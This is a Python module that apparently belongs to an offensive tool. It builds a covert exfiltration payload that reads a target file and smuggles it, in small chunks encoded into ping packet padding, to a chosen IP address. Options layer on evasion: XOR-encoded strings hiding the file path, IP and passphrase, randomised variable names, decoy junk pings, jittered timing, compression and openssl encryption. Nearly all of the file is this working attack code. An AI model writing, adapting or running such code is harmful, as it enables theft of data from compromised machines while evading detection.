import random

from ..obfuscation import xor_key, xor_encode


def _python_payload(file_path, ip, period, random_delay, randomize=False, junk=0, randomize_junk=False, compress=False, encrypt=None, passphrase='', estimate=False, obfuscate_strings=False):
    template = '''import hashlib,random,subprocess,sys,time
C,IB,R,T=12,3,5,2
F=__FILE__;IP=__IP__;P=__PERIOD__;RD=__RDELAY__
def pg(t,d):
 return subprocess.run(['ping','-c','1','-W',str(T),'-s',str(len(d)),'-p',d.hex(),t],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL).returncode==0
def ft(s):
 m,s=divmod(int(s),60);h,m=divmod(m,60)
 return f'{h:02d}:{m:02d}:{s:02d}'
with open(F,'rb') as f:data=f.read()
tot=(len(data)+C-1)//C
if tot>1<<(8*IB):sys.exit('[-] File too large')
if RD:print(f'[+] Sending {F!r} ({len(data)} bytes) to {IP!r} in {tot} pings every ({P} +- {RD}) s')
elif P:print(f'[+] Sending {F!r} ({len(data)} bytes) to {IP!r} in {tot} pings every {P} s')
else:print(f'[+] Sending {F!r} ({len(data)} bytes) to {IP!r} in {tot} pings')
if RD>P:print(f'[!] WARNING: random-delay ({RD} s) > period ({P} s)',file=sys.stderr)
ls=None;t0=time.monotonic()
for i in range(tot):
 pl=i.to_bytes(IB,'big')+data[i*C:(i+1)*C]
 for _ in range(R):
  if ls is not None:
   g=P+random.uniform(-RD,RD);time.sleep(max(0.0,ls+g-time.monotonic()))
  ls=time.monotonic()
  if pg(IP,pl):break
 else:sys.exit(f'[-] No reply for ping {i!r}, transfer aborted')
 s=i+1
 if P or RD:
  el=time.monotonic()-t0;msg='\\r  '+f'{s}/{tot} pings, {min(s*C,len(data))}/{len(data)} bytes, {100*s/tot:.0f}%, elapsed {ft(el)}'
  if not RD:msg+=f', remaining ~{ft(el/s*(tot-s))}'
  print(msg,end='',flush=True)
 elif s%100==0:print(f'  {s}/{tot}')
E='='*50;S=' '*20
print(f'\\n\\n{E}\\n{S}DONE\\n{E}\\n')
print(f'[*] SHA-256: {hashlib.sha256(data).hexdigest()}')
'''

    script = template
    _xor_key = None
    if obfuscate_strings:
        _xor_key = xor_key()
        key_str = ','.join(str(b) for b in _xor_key)
        decode_fn = f"_k=[{key_str}]\ndef _d(h):\n b=bytes.fromhex(h)\n return ''.join(chr(b[i]^_k[i%len(_k)]) for i in range(len(b)))\n"
        script = script.replace("F=__FILE__;IP=__IP__", decode_fn + "F=_d('__XFILE__');IP=_d('__XIP__')")
    if compress:
        script = script.replace('import hashlib,', 'import gzip,hashlib,', 1)
        script = script.replace(
            "with open(F,'rb') as f:data=f.read()\n",
            "with open(F,'rb') as f:data=f.read()\n"
            "hsh=hashlib.sha256(data).hexdigest()\n"
            "osz=len(data)\n"
            "data=gzip.compress(data)\n"
            "print(f'[*] Compressed: {osz} -> {len(data)} bytes ({100*len(data)/osz:.1f}%)')\n"
        )
        script = script.replace(
            "print(f'[*] SHA-256: {hashlib.sha256(data).hexdigest()}')",
            "print(f'[*] SHA-256: {hsh}')"
        )
    if encrypt:
        if obfuscate_strings:
            pass_str = "'pass:'+_d('__XPP__')"
        else:
            pass_str = repr(f'pass:{passphrase}')
        hash_line = "hsh=hashlib.sha256(data).hexdigest()\n" if not compress else ""
        script = script.replace(
            "tot=(len(data)+C-1)//C\n",
            hash_line +
            f"ep=subprocess.run(['openssl','enc','-{encrypt}','-pbkdf2','-iter','10000','-md','sha256','-pass',{pass_str}],input=data,capture_output=True)\n"
            "if ep.returncode!=0:sys.exit('[-] Encryption failed')\n"
            "data=ep.stdout\n"
            f"print('[*] Encrypted with {encrypt}')\n"
            "tot=(len(data)+C-1)//C\n"
        )
        if not compress:
            script = script.replace(
                "print(f'[*] SHA-256: {hashlib.sha256(data).hexdigest()}')",
                "print(f'[*] SHA-256: {hsh}')"
            )
    if junk > 0:
        script = script.replace('hashlib,random,', 'hashlib,os,random,', 1)
        script = script.replace('C,IB,R,T=12,3,5,2', f'C,IB,R,T,J=12,3,5,2,{junk}')
        script = script.replace("if tot>1<<(8*IB):", "if tot>=1<<(8*IB):")
        if randomize_junk:
            junk_line = "\n  jd=b'\\xff'+os.urandom(IB+C-1)"
        else:
            junk_line = '\n  jd=bytes([255]*IB)+os.urandom(C)'
        junk_code = ('\n for _ in range(J):'
                     + junk_line +
                     '\n  if ls is not None:'
                     '\n   g=P+random.uniform(-RD,RD);time.sleep(max(0.0,ls+g-time.monotonic()))'
                     '\n  ls=time.monotonic()'
                     '\n  pg(IP,jd)')
        script = script.replace(' s=i+1\n', ' s=i+1' + junk_code + '\n')
    if estimate:
        hash_expr = 'hsh' if (compress or encrypt) else 'hashlib.sha256(data).hexdigest()'
        est_lines = (
            "print('[!] ESTIMATE OPTION ENABLED — the file will NOT be transferred')\n"
            "print(f'[*] File size (after processing): {len(data)} bytes')\n"
            "print(f'[*] Data pings: {tot}')\n"
        )
        if junk > 0:
            est_lines += (
                "print(f'[*] Junk pings: {tot*J}')\n"
                "print(f'[*] Total pings: {tot*(1+J)}')\n"
            )
        else:
            est_lines += "print(f'[*] Total pings: {tot}')\n"
        total_expr = 'tot*(1+J)' if junk > 0 else 'tot'
        est_lines += (
            f"if P:print(f'[*] Estimated time: ~{{ft({total_expr}*P)}}')\n"
            f"print(f'[*] SHA-256: {{{hash_expr}}}')\n"
            "sys.exit(0)\n"
        )
        script = script.replace("ls=None;t0=time.monotonic()\n", est_lines)
    if randomize:
        import re
        var_names = [
            'data', 'msg', 'tot',
            'IB', 'IP', 'RD',
            'pg', 'ft', 'ls', 't0', 'pl', 'el',
            'C', 'R', 'T', 'F', 'P', 'E', 'S',
            'i', 'g', 't', 'd', 'm', 'h', 'f',
        ]
        if compress:
            var_names.extend(['hsh', 'osz'])
        if encrypt:
            var_names.append('ep')
            if not compress:
                var_names.append('hsh')
        if junk > 0:
            var_names.extend(['J', 'jd'])
        if obfuscate_strings:
            var_names.extend(['_k', '_d'])
        letters = 'abcdefghijklmnopqrstuvwxyz'
        alphanums = letters + '0123456789'
        py_reserved = {
            'and', 'for', 'del', 'not', 'try', 'def',
            'abs', 'all', 'any', 'bin', 'chr', 'dir', 'hex', 'int',
            'len', 'map', 'max', 'min', 'oct', 'ord', 'pow', 'set',
            'str', 'sum', 'zip', 'sys',
        }
        original_names = set(var_names)
        used = set()
        mapping = {}
        for name in var_names:
            while True:
                rand_name = random.choice(letters) + ''.join(random.choices(alphanums, k=2))
                if rand_name not in used and rand_name not in py_reserved and rand_name not in original_names:
                    used.add(rand_name)
                    mapping[name] = rand_name
                    break
        for old_name in sorted(var_names, key=len, reverse=True):
            if old_name == 'f':
                pattern = r'\bf\b(?![\'"])'
            else:
                pattern = r'\b' + re.escape(old_name) + r'\b'
            script = re.sub(pattern, mapping[old_name], script)

    if obfuscate_strings:
        script = (script
                  .replace('__XFILE__', xor_encode(file_path, _xor_key))
                  .replace('__XIP__', xor_encode(ip, _xor_key)))
        if encrypt:
            script = script.replace('__XPP__', xor_encode(passphrase, _xor_key))
        return (script
                .replace('__PERIOD__', repr(period))
                .replace('__RDELAY__', repr(random_delay)))

    return (script
            .replace('__FILE__', repr(file_path))
            .replace('__IP__', repr(ip))
            .replace('__PERIOD__', repr(period))
            .replace('__RDELAY__', repr(random_delay)))
